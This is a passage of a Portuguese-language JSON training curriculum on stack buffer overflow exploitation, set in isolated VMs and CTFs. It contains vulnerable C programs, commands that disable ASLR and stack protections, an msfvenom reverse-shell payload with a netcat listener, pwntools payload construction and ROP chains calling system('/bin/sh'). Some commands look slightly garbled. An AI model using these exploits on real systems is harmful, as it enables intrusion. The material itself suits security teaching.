                                  "subSteps": [
                                    "Examine declarações de buffers: char buf[100]; sem inicialização.",
                                    "Verifique fluxos de input: leitura de stdin, argumentos de linha de comando.",
                                    "Calcule potenciais overflows: compare tamanhos de source e destination.",
                                    "Identifique cenários de sobrescrita: return address, saved EBP.",
                                    "Use ferramentas estáticas como Splint ou Clang Static Analyzer."
                                  ],
                                  "verification": "Anote 3 linhas vulneráveis em um código fornecido e justifique.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código de exemplo vulnerável (ex: de Damn Vulnerable C)",
                                    "Ferramentas: cppcheck, splint"
                                  ],
                                  "tips": "Siga o fluxo de dados do input até o buffer com setas no código.",
                                  "learningObjective": "Desenvolver habilidade em auditoria estática de código para detecção de overflows.",
                                  "commonMistakes": [
                                    "Focar só em funções óbvias, ignorar loops ou recursão",
                                    "Não considerar inputs dinâmicos de rede",
                                    "Subestimar overflows em estruturas ou unions"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular e Confirmar Vulnerabilidades de Sobrescrita",
                                  "subSteps": [
                                    "Compile código com flags de debug: gcc -g -fno-stack-protector.",
                                    "Use GDB para injetar input longo e observar crash (segmentation fault).",
                                    "Monitore com Valgrind para detecção de overflows.",
                                    "Simule sobrescrita de return address alterando EIP/RIP.",
                                    "Documente o PoC (Proof of Concept) com script de exploit simples."
                                  ],
                                  "verification": "Execute simulação e capture screenshot de GDB mostrando sobrescrita.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "Valgrind",
                                    "Ambiente Linux/WSL para stack sem proteções"
                                  ],
                                  "tips": "Desative ASLR com 'echo 0 > /proc/sys/kernel/randomize_va_space' temporariamente.",
                                  "learningObjective": "Validar vulnerabilidades através de testes dinâmicos e depuração.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar proteções como Canary ou NX",
                                    "Não usar input controlado (ex: python -c 'print \"A\"*200')",
                                    "Ignorar diferenças entre 32-bit e 64-bit"
                                  ]
                                }
                              ],
                              "practicalExample": "Considere este código C vulnerável:\n#include <string.h>\n#include <stdio.h>\nint main(int argc, char** argv) {\n  char buf[64];\n  strcpy(buf, argv[1]);\n  printf(\"%s\\n\", buf);\n  return 0;\n}\nCompile e execute: ./vuln $(python3 -c 'print(\"A\"*100)'). Observará segfault devido a strcpy sem limite, sobrescrevendo o return address.",
                              "finalVerifications": [
                                "Identificar strcpy sem verificação em código aleatório com 100% de acurácia.",
                                "Explicar o impacto de overflow em controle de fluxo (ROP possível).",
                                "Simular overflow em GDB e apontar sobrescrita de EBP/EIP.",
                                "Sugerir 3 fixes: usar strncpy, validação de input, etc.",
                                "Detectar variação com gets() ou sprintf em novo código.",
                                "Usar Valgrind para confirmar leak/invalidação sem crash."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de funções inseguras (90%+).",
                                "Profundidade da análise de fluxo de dados e tamanhos.",
                                "Qualidade da simulação PoC com evidências (screenshots/logs).",
                                "Correção conceitual em diagramas e explicações.",
                                "Criatividade em sugestões de mitigação e boas práticas.",
                                "Tempo de detecção em códigos complexos (<10 min)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Linguagens de Baixo Nível (C/C++)",
                                "Análise de Código Estático e Dinâmica",
                                "Engenharia Reversa e Exploit Development",
                                "Ética e Conformidade em Desenvolvimento Seguro",
                                "Redes e Protocolos (inputs de rede em buffers)"
                              ],
                              "realWorldApplication": "Em auditorias de segurança para software crítico como navegadores (ex: Chrome V8 engine), servidores web (Apache), ou firmware IoT, onde buffer overflows foram explorados em ataques como Code Red worm ou Heartbleed, permitindo execução remota de código e breaches massivos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.1.2",
                            "name": "Explorar overflow para hijacking de retorno",
                            "description": "Construir um payload que sobrescreva o endereço de retorno apontando para shellcode, demonstrando execução de comandos em ambiente virtualizado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de teste virtualizado",
                                  "subSteps": [
                                    "Instalar e configurar uma máquina virtual (VM) usando VirtualBox ou VMware com Kali Linux ou Ubuntu.",
                                    "Desabilitar proteções de memória: executar 'sysctl -w kernel.randomize_va_space=0' para desativar ASLR e compilar com flags '-fno-stack-protector -z execstack'.",
                                    "Baixar ou criar um programa vulnerável em C com buffer overflow, como um exemplo com gets() em buffer pequeno.",
                                    "Compilar o programa: gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln.",
                                    "Instalar ferramentas: gdb, pwndbg, python3 para scripting."
                                  ],
                                  "verification": "Executar o programa na VM sem crashes iniciais e confirmar que ASLR está off com 'cat /proc/sys/kernel/randomize_va_space' retornando 0.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "ISO Kali Linux",
                                    "Código fonte vuln.c",
                                    "GCC compiler"
                                  ],
                                  "tips": "Sempre teste em VM isolada para evitar riscos à máquina host; snapshot antes de exploits.",
                                  "learningObjective": "Preparar um ambiente controlado e seguro para experimentação com exploits de buffer overflow.",
                                  "commonMistakes": [
                                    "Executar em máquina principal",
                                    "Esquecer de desabilitar ASLR/NX",
                                    "Usar arquitetura 64-bit sem -m32"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o programa vulnerável e mapear o stack",
                                  "subSteps": [
                                    "Executar o programa com gdb: gdb ./vuln.",
                                    "Usar pattern_create do pwntools para gerar string única e encontrar offset: python3 -c 'from pwn import *; print(cyclic(200))' | ./vuln.",
                                    "No gdb, após crash: 'cyclic -l $(cat /proc/$!/status | grep ^AuxV)', identificar endereço de retorno sobrescrito.",
                                    "Desmontar a função vulnerável: disas main ou função com buffer.",
                                    "Identificar endereço de shellcode desejado, como início do buffer."
                                  ],
                                  "verification": "Determinar o offset exato (ex: 112 bytes) onde o endereço de retorno é sobrescrito.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB",
                                    "pwntools (pip install pwntools)",
                                    "Programa vuln"
                                  ],
                                  "tips": "Use 'info registers' no gdb para ver EIP sobrescrito; pwndbg facilita com 'cyclic'.",
                                  "learningObjective": "Compreender o layout do stack e calcular o offset preciso para hijacking.",
                                  "commonMistakes": [
                                    "Confundir endianness little-endian",
                                    "Não alinhar stack corretamente",
                                    "Ignorar alinhamento de 4 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir o shellcode e o payload completo",
                                  "subSteps": [
                                    "Gerar shellcode simples com msfvenom: msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python -a x86 --platform linux.",
                                    "Calcular endereço de retorno: usar gdb para encontrar endereço fixo do buffer (ex: 0xffffd000).",
                                    "Montar payload: NOP sled (90 bytes) + shellcode + padding até offset + endereço de retorno (4 bytes little-endian).",
                                    "Scriptar em Python: from pwn import *; payload = b'A'*offset + p32(addr) + shellcode; print(payload).",
                                    "Testar payload em Python para comprimento e hex dump."
                                  ],
                                  "verification": "Payload tem tamanho correto e endereço de retorno aponta para início do shellcode (ver com xxdd).",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "msfvenom",
                                    "Python3",
                                    "pwntools"
                                  ],
                                  "tips": "Adicione NOP sled para tolerância a offsets; teste shellcode isolado primeiro.",
                                  "learningObjective": "Criar um payload funcional que redirecione o controle para shellcode executável.",
                                  "commonMistakes": [
                                    "Shellcode com null bytes (\\x00)",
                                    "Endereço em big-endian",
                                    "Falta de NOP sled"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar o exploit e demonstrar hijacking",
                                  "subSteps": [
                                    "Iniciar netcat listener: nc -lvnp 4444.",
                                    "Enviar payload: (python3 -c 'print(payload)') | ./vuln ou usar pwn.process().",
                                    "No gdb: run $(python3 -c '...') e observar EIP pulando para shellcode.",
                                    "Verificar execução: shell abre no netcat, executar comandos como 'whoami' ou 'cat flag.txt'.",
                                    "Analisar com gdb: 'x/50i $pc' para disassemble shellcode rodando."
                                  ],
                                  "verification": "Shellcode executa, reverse shell conecta e comandos rodam sem crash.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Netcat",
                                    "GDB",
                                    "Payload script"
                                  ],
                                  "tips": "Use 'set follow-fork-mode child' no gdb se fork; rode sem gdb para teste real.",
                                  "learningObjective": "Demonstrar sucesso no hijacking de retorno e execução arbitrária de código.",
                                  "commonMistakes": [
                                    "Firewall bloqueando porta",
                                    "ASLR reativado",
                                    "Shellcode incompatível com arch"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar e mitigar o exploit",
                                  "subSteps": [
                                    "Recompilar com proteções: gcc -fstack-protector-strong -pie vuln.c.",
                                    "Testar payload falhando e explicar stack canary, ASLR, NX.",
                                    "Explorar bypass básicos: ROP chain intro com 'ROPgadget --binary vuln'.",
                                    "Documentar lições: registrar offset, payload hex, saída gdb.",
                                    "Limpar VM: restaurar snapshot."
                                  ],
                                  "verification": "Exploit falha com proteções on; entender por quê.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "ROPgadget",
                                    "Documentação"
                                  ],
                                  "tips": "Pesquise mitigações modernas como CFI para contexto avançado.",
                                  "learningObjective": "Compreender defesas contra return hijacking e boas práticas de compilação.",
                                  "commonMistakes": [
                                    "Não testar mitigações",
                                    "Ignorar contexto ético/legal"
                                  ]
                                }
                              ],
                              "practicalExample": "Programa vuln.c: #include <stdio.h>; #include <string.h>; void func(char* input) { char buf[64]; strcpy(buf, input); } int main() { char input[100]; gets(input); func(input); return 0; }. Payload: 100 NOPs + shellcode reverse_tcp + padding 112 bytes + p32(0xffffd050). Executar envia shell para nc localhost:4444.",
                              "finalVerifications": [
                                "Offset calculado corretamente causa crash no endereço de retorno.",
                                "Payload redireciona EIP para shellcode sem crashes prematuros.",
                                "Reverse shell conecta e executa comandos como 'id' ou 'ls'.",
                                "GDB mostra execução de shellcode via 'x/i $pc'.",
                                "Exploit falha com stack protector ativado.",
                                "Documentação inclui hex dump do payload e prints gdb."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de offset e construção do payload (sem null bytes).",
                                "Execução bem-sucedida do hijacking em ambiente controlado.",
                                "Análise clara do stack layout via gdb/pwndbg.",
                                "Inclusão de NOP sled e verificação de alinhamento.",
                                "Compreensão de mitigações e discussão ética.",
                                "Relatório com evidências (screenshots, logs)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Manipulação de strings e ponteiros.",
                                "Assembly x86: Leitura de EIP, instruções de shellcode.",
                                "Sistemas Operacionais: Layout de stack, syscalls Linux.",
                                "Ética e Direito: Uso responsável em pentesting legal.",
                                "Matemática: Cálculos de endereços e endianness."
                              ],
                              "realWorldApplication": "Identificar e explorar vulnerabilidades em software legado durante testes de penetração (pentests) autorizados, ajudando organizações a corrigir buffer overflows antes de ataques reais, como em CTFs ou bug bounties."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.1.3",
                            "name": "Analisar binários com ferramentas como GDB",
                            "description": "Usar depuradores para inspecionar o layout da pilha e mapear endereços durante uma exploração de overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Binário Vulnerável com Símbolos de Debug",
                                  "subSteps": [
                                    "Crie um arquivo vuln.c com uma função vulnerável a buffer overflow, como: #include <stdio.h>; #include <string.h>; int main() { char buf[64]; gets(buf); return 0; }",
                                    "Compile com flags específicas: gcc -g -fno-stack-protector -z execstack -no-pie -o vuln vuln.c",
                                    "Verifique o binário: ls -la vuln && file vuln && checksec vuln (para confirmar ausência de proteções)",
                                    "Teste execução básica: ./vuln e insira input curto para confirmar funcionamento normal",
                                    "Anote o endereço base do binário com gdb info proc mappings"
                                  ],
                                  "verification": "O binário compila sem erros, possui símbolos de debug (objdump -t vuln mostra símbolos) e executa sem proteções ativadas (checksec confirma NX=off, Canary=off)",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code ou vim)",
                                    "GCC compiler instalado",
                                    "Terminal Linux",
                                    "Ferramenta checksec (apt install checksec)"
                                  ],
                                  "tips": "Sempre use -g para símbolos e desabilite proteções apenas em ambiente controlado de aprendizado; evite rodar como root",
                                  "learningObjective": "Configurar um binário realista para análise de vulnerabilidades de memória com suporte a debugging",
                                  "commonMistakes": [
                                    "Esquecer flag -g resultando em sem símbolos",
                                    "Deixar stack-protector ativado bloqueando overflow",
                                    "Compilar com PIE dificultando endereços fixos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Iniciar GDB e Configurar Breakpoints Iniciais",
                                  "subSteps": [
                                    "Inicie o GDB: gdb ./vuln",
                                    "Defina breakpoint na função vulnerável: break main ou break *main+offset (use list para ver código)",
                                    "Execute até o breakpoint: run",
                                    "Liste breakpoints e contexto: info breakpoints && info registers && disassemble main",
                                    "Continue até ponto pré-overflow: next ou step até chamada gets()"
                                  ],
                                  "verification": "GDB para no breakpoint correto e 'info registers' mostra valores iniciais de ESP, EBP e EIP",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GDB instalado (gdb --version)",
                                    "Binário vuln preparado",
                                    "Terminal"
                                  ],
                                  "tips": "Use 'layout asm' para view assembly side-by-side com source; 'tui enable' para interface TUI",
                                  "learningObjective": "Navegar eficientemente no fluxo de execução para isolar o ponto de vulnerabilidade",
                                  "commonMistakes": [
                                    "Breakpoint errado levando a skip da vulnerabilidade",
                                    "Usar 'run' sem args causando input imediato",
                                    "Ignorar disassembly perdendo visão low-level"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inspecionar Layout da Pilha e Registers Antes do Overflow",
                                  "subSteps": [
                                    "Examine stack pointer: x/20wx $esp (exibe 20 words na stack)",
                                    "Inspecione frame pointer: x/wx $ebp && info frame",
                                    "Liste argumentos e locals: print buf (se visível) && x/10gx $rsp-100",
                                    "Anote offsets: calcule distância de buf até saved EBP e RET (use x command iterativamente)",
                                    "Dump stack completa: dump memory stack.dump $esp $esp+200",
                                    "Verifique ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space (temporário)"
                                  ],
                                  "verification": "Stack dump mostra claramente buffer local, saved EBP e endereço de retorno adjacentes",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB ativo com binário carregado",
                                    "Calculadora para offsets (ou gdb calc plugin)"
                                  ],
                                  "tips": "Use 'x/s $esp-offset' para strings; macro personalizada: define dumpstack, x/32gx $rsp, end para reutilizar",
                                  "learningObjective": "Mapear precisamente a estrutura da stack frame (locais, saved registers, RET)",
                                  "commonMistakes": [
                                    "Confundir ESP com EBP",
                                    "Examinar stack errada (heap vs stack)",
                                    "Ignorar alinhamento de 8 bytes em 64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular Overflow e Mapear Endereços Durante Exploração",
                                  "subSteps": [
                                    "Prepare input crafted: python -c 'print(\"A\"*80)' > input.txt",
                                    "Rode com input: run < input.txt ou set args $(python -c 'print(\"A\"*100)')",
                                    "Após crash, examine core: info registers (note EIP sobrescrito com 0x41414141)",
                                    "Calcule offset exato: gere inputs com patterns (cyclic de pwntools: cyclic 200) e encontre offset com 'x/wx $ebp-4'",
                                    "Teste ROP básico: run com payload para overwrite RET para system() ou win func",
                                    "Documente chain: anote offsets para buf, EBP, RET e possíveis gadgets"
                                  ],
                                  "verification": "EIP controlado pelo input (ex: 0x41414141) e offset calculado permite overwrite preciso de RET",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Python para payloads",
                                    "pwntools (pip install pwntools) para cyclic",
                                    "GDB-PEDA ou GEF plugin para facilidades"
                                  ],
                                  "tips": "Instale GEF/PEDA para visuals melhores (gef.gdbinit); use 'pattern create 200' e 'pattern offset 0x41414141'",
                                  "learningObjective": "Explorar ativamente overflow para controlar fluxo e mapear endereços precisos",
                                  "commonMistakes": [
                                    "Input curto sem reach RET",
                                    "ASLR on alterando endereços",
                                    "Não salvar core dump para análise pós-crash"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar e Verificar Descobertas Finais",
                                  "subSteps": [
                                    "Gere relatório: anote offsets (ex: buf=0xlocal, RET@72 bytes)",
                                    "Teste confirmação: rode com payload exato para jump shellcode",
                                    "Compare com tools: use objdump -d vuln para gadgets || ROPgadget",
                                    "Limpe ASLR e proteções: set disable-randomization on em GDB",
                                    "Exporte session: gdb -batch -ex 'generate-core-dump' para análise offline"
                                  ],
                                  "verification": "Payload crafted redireciona EIP para endereço desejado sem crash aleatório",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "ROPgadget instalado",
                                    "Editor para relatório"
                                  ],
                                  "tips": "Automatize com pwntools script para validação; sempre teste em VM isolada",
                                  "learningObjective": "Sintetizar análise em conhecimento acionável para exploits ou mitigações",
                                  "commonMistakes": [
                                    "Assumir offsets fixos sem testar múltiplas runs",
                                    "Não considerar endianness em multi-byte overwrites",
                                    "Pular validação com payload funcional"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário vuln.c com char buf[64]; gets(buf);, use GDB: break main, run, x/20wx $esp pré-overflow (veja buf@0xff.., RET@0x40+), input 'A'*80 causa crash com EIP=0x41414141, cyclic encontra offset=72, payload='A'*72 + 'BBBB' overwrite RET para 0x42424242 confirmando controle.",
                              "finalVerifications": [
                                "Identifica offset exato do buffer até endereço de retorno (ex: 72 bytes)",
                                "Controla EIP com input crafted sem ASLR interferindo",
                                "Mapeia saved EBP, RET e possíveis ROP gadgets via info registers e x/",
                                "Gera dump da stack pré/pós-overflow mostrando overwrite claro",
                                "Testa payload para redirecionar a função win() ou system()",
                                "Documenta endereços base estáveis em múltiplas execuções"
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de offsets (erro <2 bytes)",
                                "Uso correto de comandos GDB (x/, info registers, break, run < file)",
                                "Interpretação correta do layout stack (locais -> EBP -> RET)",
                                "Eficiência: completa análise em <2h com payloads funcionais",
                                "Relatório claro com dumps, screenshots e offsets anotados",
                                "Segurança: roda apenas em ambiente isolado sem riscos reais"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Gerenciamento de arrays, pointers e chamadas de função",
                                "Assembly x86: Leitura de registers (ESP, EBP, EIP) e instruções de stack",
                                "Sistemas Operacionais: Modelos de stack, ASLR, proteções como Canary/NX",
                                "Matemática Computacional: Cálculo de offsets e padrões cíclicos",
                                "Engenharia de Software: Debugging, testing de vulnerabilidades e relatórios"
                              ],
                              "realWorldApplication": "Analistas de cibersegurança usam GDB em pentests para dissecar binários vulneráveis, desenvolver PoCs de exploits em CTFs/concursos como Pwn2Own, e auditar software legado em empresas, identificando e mitigando buffer overflows antes de exploração por atacantes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.3.2",
                        "name": "Programação Orientada a Retornos (ROP)",
                        "description": "Técnica avançada que utiliza 'gadgets' existentes no binário para construir cadeias de execução sem injetar novo código, contornando proteções como NX.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.2.1",
                            "name": "Identificar gadgets ROP em binários",
                            "description": "Utilizar ferramentas como ROPgadget para extrair sequências de instruções terminadas em RET do código executável.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de análise",
                                  "subSteps": [
                                    "Instale o ROPgadget via pip: pip install ROPgadget.",
                                    "Baixe ou compile um binário ELF de 64 bits sem proteções (ex: use gcc -fno-stack-protector -z execstack).",
                                    "Verifique a instalação executando ROPgadget --version.",
                                    "Prepare um diretório de trabalho com o binário exemplo (ex: challenge.bin).",
                                    "Instale dependências adicionais como pwntools para suporte opcional."
                                  ],
                                  "verification": "Execute ROPgadget --help e confirme que todas as opções são exibidas sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Python 3+",
                                    "pip",
                                    "GCC",
                                    "Binário ELF de exemplo"
                                  ],
                                  "tips": "Use um ambiente virtual (venv) para isolar dependências e evitar conflitos.",
                                  "learningObjective": "Configurar ferramentas essenciais para análise ROP de forma eficiente e reproduzível.",
                                  "commonMistakes": [
                                    "Não desabilitar ASLR/PIE no binário",
                                    "Instalar em ambiente sem privilégios",
                                    "Ignorar arquitetura (use --binary arch=amd64)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar ROPgadget em um binário básico",
                                  "subSteps": [
                                    "Navegue para o diretório do binário: cd /path/to/binary.",
                                    "Execute ROPgadget --binary challenge.bin para listar todos os gadgets.",
                                    "Salve a saída em um arquivo: ROPgadget --binary challenge.bin > gadgets.txt.",
                                    "Filtre por gadgets com RET: ROPgadget --binary challenge.bin --reta.",
                                    "Experimente opções como --string para gadgets com strings úteis."
                                  ],
                                  "verification": "Confirme que a saída lista pelo menos 10 gadgets terminados em 'ret' (0xC3 em x86_64).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Binário challenge.bin",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Use --depth 1 para gadgets simples; aumente para chains mais longas.",
                                  "learningObjective": "Executar comandos ROPgadget corretos e interpretar saídas iniciais.",
                                  "commonMistakes": [
                                    "Executar em binários com PIE ativado (desative com -no-pie)",
                                    "Confundir endianness em arquiteturas",
                                    "Ignorar warnings de arquitetura incompatível"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar e interpretar gadgets ROP identificados",
                                  "subSteps": [
                                    "Abra o arquivo gadgets.txt e identifique padrões como 'pop rdi ; ret'.",
                                    "Classifique gadgets por tipo: pop registers, mov, arithmetic, system calls.",
                                    "Use objdump -d challenge.bin para correlacionar gadgets com offsets no disassembly.",
                                    "Anote offsets hexadecimais e instruções assembly para cada gadget RET.",
                                    "Verifique unicidade removendo duplicatas com --nosort."
                                  ],
                                  "verification": "Crie uma tabela com 5 gadgets, incluindo offset, instruções e utilidade (ex: pop para argumentos).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "ROPgadget output",
                                    "objdump",
                                    "Editor de texto"
                                  ],
                                  "tips": "Procure gadgets que zerem registradores ou movam valores para stack/heap.",
                                  "learningObjective": "Interpretar saídas ROPgadget para extrair instruções acionáveis terminadas em RET.",
                                  "commonMistakes": [
                                    "Interpretar offsets como decimais em vez de hex",
                                    "Ignorar gadgets com instruções condicionais",
                                    "Não validar gadgets em debugger como GDB"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e filtrar gadgets para chains ROP",
                                  "subSteps": [
                                    "Use ROPgadget --binary challenge.bin --ropchain para gerar chains automáticas.",
                                    "Teste gadgets em GDB: (gdb) break *offset_gadget; run; examine registradores.",
                                    "Filtre por bad chars ou proteções com --badbytes '\\x00'.",
                                    "Combine gadgets manualmente para uma chain simples (ex: pop rdi + execve).",
                                    "Documente uma chain viável com offsets encadeados."
                                  ],
                                  "verification": "Execute uma chain ROP em GDB e confirme execução sequencial sem crash.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB",
                                    "Binário com gadgets",
                                    "ROPgadget"
                                  ],
                                  "tips": "Integre com pwndbg para visualização melhor em GDB.",
                                  "learningObjective": "Validar gadgets em runtime e construir primitives ROP básicas.",
                                  "commonMistakes": [
                                    "Não alinhar stack para chains",
                                    "Usar gadgets com side-effects inesperados",
                                    "Esquecer de considerar Canary ou NX"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário challenge.bin compilado com gcc -m64 -fno-stack-protector -no-pie -z execstack, execute ROPgadget --binary challenge.bin --reta | grep 'pop rdi' para encontrar 0x0000000000400523 : pop rdi ; ret, útil para setar argumento de system('/bin/sh').",
                              "finalVerifications": [
                                "Listar manualmente 10+ gadgets RET de um binário novo.",
                                "Gerar e validar uma chain ROP de 3 gadgets em GDB.",
                                "Identificar ausência de gadgets em binários protegidos (ex: com FORTIFY).",
                                "Comparar saídas ROPgadget vs. rp++ para consistência.",
                                "Documentar offsets e assembly de gadgets chave.",
                                "Executar ROPgadget com filtros avançados sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets terminados em RET (100% match com tool).",
                                "Capacidade de interpretar assembly e offsets corretamente.",
                                "Validação prática em debugger (sem crashes em chains).",
                                "Cobertura de filtros e opções ROPgadget (reta, ropchain, badbytes).",
                                "Análise de utilidade para exploits reais (pop, mov, calls).",
                                "Documentação clara com tabelas e exemplos."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly (x86_64): Leitura de instruções e registradores.",
                                "Engenharia Reversa: Uso de objdump, radare2 ou Ghidra para validação.",
                                "Arquitetura de Computadores: Compreensão de call/ret e stack.",
                                "Exploração de Vulnerabilidades: Contexto em buffer overflows e CFI bypass.",
                                "Programação em Python: Scripts para automação de ROP chains."
                              ],
                              "realWorldApplication": "Em pentests e CTFs, pentesters usam ROPgadget para mapear gadgets em binários vulneráveis, construindo exploits ROP que bypassam DEP/NX em ataques de controle de fluxo como return-to-libc ou ROP chains completas para shellcode execution."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.2.2",
                            "name": "Construir chains ROP para execução de funções",
                            "description": "Montar uma cadeia de gadgets para chamar funções como system() com argumentos específicos, simulando execução em CTF.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e coletar gadgets ROP necessários",
                                  "subSteps": [
                                    "Analise o binário com ferramentas como ROPgadget ou ROPem para listar gadgets disponíveis.",
                                    "Busque gadgets específicos como 'pop rdi; ret;', 'pop rsi; ret;', e gadgets para alinhamento de stack.",
                                    "Filtre gadgets por utilidade para preparar argumentos da função system() (ex: rdi para primeiro argumento).",
                                    "Anote endereços de gadgets em um script ou notepad para uso posterior.",
                                    "Verifique compatibilidade de arquitetura (x86_64) e proteções como ASLR (desabilite para lab)."
                                  ],
                                  "verification": "Lista de pelo menos 5 gadgets relevantes com endereços anotados e testados via gdb.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "ROPgadget ou ROPem",
                                    "gdb ou pwndbg",
                                    "Binário vulnerável de CTF"
                                  ],
                                  "tips": "Priorize gadgets curtos e com 'ret' no final para chaining suave.",
                                  "learningObjective": "Dominar a descoberta de primitives ROP para manipulação de registradores.",
                                  "commonMistakes": [
                                    "Ignorar gadgets com side-effects indesejados",
                                    "Não considerar endianness em strings"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar endereços de funções e payloads",
                                  "subSteps": [
                                    "Use objdump ou gdb para encontrar endereço da função system() na libc.",
                                    "Extraia ou crie endereço de string payload como '/bin/sh' no binário ou heap.",
                                    "Identifique endereço de exit() para evitar crash pós-shell.",
                                    "Calcule offsets necessários considerando ASLR parcial (use leak se aplicável).",
                                    "Teste endereços isoladamente com gdb para confirmar acessibilidade."
                                  ],
                                  "verification": "Endereços válidos de system(), '/bin/sh' e exit() confirmados via breakpoint em gdb.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "gdb-peda/pwndbg",
                                    "strings tool",
                                    "Libc.so.6 do ambiente de teste"
                                  ],
                                  "tips": "Use 'gef-pwndbg' para visualização automática de ROP chains.",
                                  "learningObjective": "Aprender a mapear memória para construção de exploits ROP.",
                                  "commonMistakes": [
                                    "Usar endereços absolutos sem considerar ASLR",
                                    "Strings malformadas sem null-byte"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Montar a chain de ROP no stack",
                                  "subSteps": [
                                    "Estruture o buffer overflow para sobrescrever return address com primeiro gadget (pop rdi; ret).",
                                    "Adicione endereço de '/bin/sh' após pop rdi para rdi = payload.",
                                    "Encadeie com endereço de system() para chamada da função.",
                                    "Inclua padding para alinhamento de stack (geralmente 8 bytes em x64).",
                                    "Adicione gadget para pop rsi se necessário, seguido de exit() para cleanup."
                                  ],
                                  "verification": "Chain representada em Python (pwntools) ou hex dump, com sequência lógica de endereços.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Python com pwntools",
                                    "Editor hex ou pwndbg stack viewer"
                                  ],
                                  "tips": "Use pwntools ROP builder para automação inicial e aprendizado manual.",
                                  "learningObjective": "Construir sequências ROP funcionais para execução arbitrária.",
                                  "commonMistakes": [
                                    "Ordem errada de gadgets/argumentos",
                                    "Falta de alinhamento de stack"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar, testar e depurar a exploit",
                                  "subSteps": [
                                    "Escreva script Python com pwntools para gerar payload e enviar via stdin/process.",
                                    "Execute em ambiente controlado (gdb) para step-through da chain.",
                                    "Monitore registradores e stack para confirmar setup correto pré-system().",
                                    "Ajuste para bypass de NX (se W^X) usando ROP one-gadget se necessário.",
                                    "Teste remotamente em servidor CTF e refine com leaks se ASLR ativo."
                                  ],
                                  "verification": "Shell interativa obtida (local ou remote) sem crash prematuro.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Pwntools library",
                                    "Binário CTF vulnerável",
                                    "Servidor de teste ou Docker"
                                  ],
                                  "tips": "Sempre rode com 'checksec' para identificar mitigações antes.",
                                  "learningObjective": "Validar e iterar exploits ROP em cenários reais de CTF.",
                                  "commonMistakes": [
                                    "Não limpar stack pós-chain",
                                    "Ignorar mitigações como Canary"
                                  ]
                                }
                              ],
